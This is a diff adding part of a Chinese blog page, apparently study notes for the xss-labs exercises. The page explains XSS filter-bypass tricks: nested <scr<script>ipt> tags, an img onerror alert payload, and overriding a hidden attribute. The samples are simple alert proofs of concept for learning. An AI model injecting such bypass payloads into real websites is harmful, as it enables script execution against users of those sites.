+<p>在这种情况下，攻击者通过嵌套的 <code>&lt;script&gt;</code> 标签来绕过一些过滤机制，浏览器会自动修复并执行有效的 <code>&lt;script&gt;</code> 标签内容，尽管 <code>&lt;scr&lt;script&gt;ipt&gt;</code> 看起来是无效的。</p>
+<p><strong>修正方式：</strong></p>
+<ul>
+<li>浏览器会将 <code>&lt;scr&lt;script&gt;ipt&gt;</code> 修复成一个合法的 <code>&lt;script&gt;</code> 标签并执行其中的 JavaScript 代码。</li>
+<li>这个修复方式因浏览器而异，但大多数现代浏览器都能容忍这种错误，并将其转化为可执行的脚本。</li>
+</ul>
+<h3 id="2-结束标签容错"><a href="#2-结束标签容错" class="headerlink" title="2. 结束标签容错"></a>2. <strong>结束标签容错</strong></h3><p>在 HTML 中，一些标签（如 <code>&lt;a&gt;</code>, <code>&lt;img&gt;</code>, <code>&lt;iframe&gt;</code>, <code>&lt;div&gt;</code> 等）在渲染时，浏览器通常允许缺少闭合标签。这种容错行为使得攻击者能够注入一些脚本而不被直接识别为有效的标签。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">&lt;img src=&quot;x&quot; onerror=&quot;alert(&#x27;XSS&#x27;)&quot;&gt;</span><br></pre></td></tr></table></figure>
+
+<p>这里，<code>&lt;img&gt;</code> 标签是一个自闭合标签，不需要闭合。攻击者利用 <code>onerror</code> 事件处理器来注入 JavaScript 代码。如果浏览器无法加载图片，它就会触发 <code>onerror</code> 事件，从而执行 JavaScript。</p>
+<h3 id="3-属性覆盖绕过"><a href="#3-属性覆盖绕过" class="headerlink" title="3.属性覆盖绕过"></a>3.属性覆盖绕过</h3><p><a target="_blank" rel="noopener" href="http://localhost/xss-labs/level10.php?keyword=">欢迎来到level10</a></p>
+<p>部分情况下，有些属性（例如type=“hidden”）会给注入带来不便，这时可以在该属性前构造属性名相同但属性值符合我们要求的属性，（type=“text”）来绕开问题</p>
+
+    </article>
+    <!--  -->
+    <div class="post-prev-next">
+  
+  <div class="link-wrapper">
+    
+    <a style="background-image: url(/images/no-cover.png);" class="link-cover" href="/2025/02/04/SQL%E6%B3%A8%E5%85%A5/">
+      <div class="overlay"></div>
+    </a>
+    
+    <div class="link-text">
+      <span>上一篇</span>
+      <span class="link-title"></span>
+    </div>
+  </div>
+  
+  
+</div>
+    
+    
+
+<div class="divide"></div>
+
+
+<div class="iconfont icon-comment"><span>评论</span></div>
+
+<div id="comment" class="comment markdown"></div>
+
+
+    
+  </section>
+  <section class="aside-wrapper">
+  <aside class="aside-content">
+    <div class="aside-card post-toc">
+      <header class="aside-card-title">
+        <span class="iconfont icon-toc"></span>目录
+      </header>
+      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#1-%E6%A6%82%E5%BF%B5"><span class="toc-number">1.</span> <span class="toc-text">1.概念</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#2-%E6%94%BB%E5%87%BB%E5%8E%9F%E7%90%86"><span class="toc-number">2.</span> <span class="toc-text">2.攻击原理</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#3-XXS%E7%9A%84%E5%88%86%E7%B1%BB"><span class="toc-number">3.</span> <span class="toc-text">3.XXS的分类</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#1-%E5%AD%98%E5%82%A8%E5%9E%8BXXS"><span class="toc-number">3.1.</span> <span class="toc-text">1.存储型XXS</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-%E5%8F%8D%E5%B0%84%E5%9E%8BXXS"><span class="toc-number">3.2.</span> <span class="toc-text">2.反射型XXS</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3-DOM"><span class="toc-number">3.3.</span> <span class="toc-text">3.DOM</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#4-JSONP-%E6%94%BB%E5%87%BB%E6%A8%A1%E5%BC%8F"><span class="toc-number">3.4.</span> <span class="toc-text">4.JSONP 攻击模式</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#4-XSS%E7%9A%84%E6%94%BB%E5%87%BB%E5%AF%B9%E8%B1%A1"><span class="toc-number">4.</span> <span class="toc-text">4.XSS的攻击对象</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#1-HTML%E6%B3%A8%E9%87%8A"><span class="toc-number">4.1.</span> <span class="toc-text">1.HTML注释</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-HTML%E6%A0%87%E7%AD%BE"><span class="toc-number">4.2.</span> <span class="toc-text">2.HTML标签</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-HTML%E6%A0%87%E7%AD%BE%E5%90%8D%EF%BC%9A"><span class="toc-number">4.2.1.</span> <span class="toc-text">1.HTML标签名：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-HTML%E5%B1%9E%E6%80%A7%E5%90%8D%EF%BC%9A"><span class="toc-number">4.2.2.</span> <span class="toc-text">2.HTML属性名：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-HTML%E5%B1%9E%E6%80%A7%E5%80%BC"><span class="toc-number">4.2.3.</span> <span class="toc-text">**3.HTML属性值</span></a></li></ol></li></ol></li></ol>
+    </div>
+    <div class="aside-card latest-posts">
+      <header class="aside-card-title">
+        <span class="iconfont icon-history"></span>最新推荐
+      </header>
+      <ul class="latest-post-list">
+    <li class="latest-post">
+      <a class="post-link" href="/2025/02/04/SQL%E6%B3%A8%E5%85%A5/">
+        <img class="post-cover" src="/images/no-cover.png" />
+        <div class="post-info">
+          <span class="title">没有标题啦~</span>
+          <span class="time">2025-02-04</span>
+        </div>
+      </a>
+    </li>
+  
+    <li class="latest-post">
+      <a class="post-link" href="/2024/11/08/xss%E5%B0%8F%E5%AF%84%E5%B7%A7/">
+        <img class="post-cover" src="/images/no-cover.png" />
+        <div class="post-info">
+          <span class="title">XSS</span>
+          <span class="time">2024-11-08</span>
+        </div>
+      </a>
+    </li>
+  </ul>
+    </div>
+  </aside>
+</section>
+</div>
+
+<div class="preview-overlay">
+  <div class="preview-wrapper">
+    <img class="preview-img" alt="Preview" />
+    <div class="slot"></div>
+    <ul class="img-list"></ul>
+  </div>
+</div>
+
+<script src="/js/page/post/index.js" type="module" defer></script>
+
+    <div id="theme-btn" class="iconfont"></div>
+  </main>
+  <footer class="page-footer animate__animated animate__fadeIn">
+  
+  <p class="footer__desc">
+    
+  </p>
+  <p class="copyright">Copyright © 2025-2025 szkangcheng </span>
+  <p>Powered by <a href="https://hexo.io/" title="Hexo" target="_blank" rel="noopener">Hexo</a> & <a href="https://github.com/FE-Alog/hexo-theme-alog" title="Hexo-theme-alog" target="_blank" rel="noopener">Hexo-theme-alog</a> </p>
+  
+</footer>
+</body>
+
+
+    <script>
+      window.CONFIG = {"search":{},"i18n":{"search":{"title":"本地搜索","result_title":"${resultNum} 条结果","placeholder":"请输入关键字","no_result":"搜索不到呢~","tips":"搜索"}}};
+    </script>
+  
+
+</html>
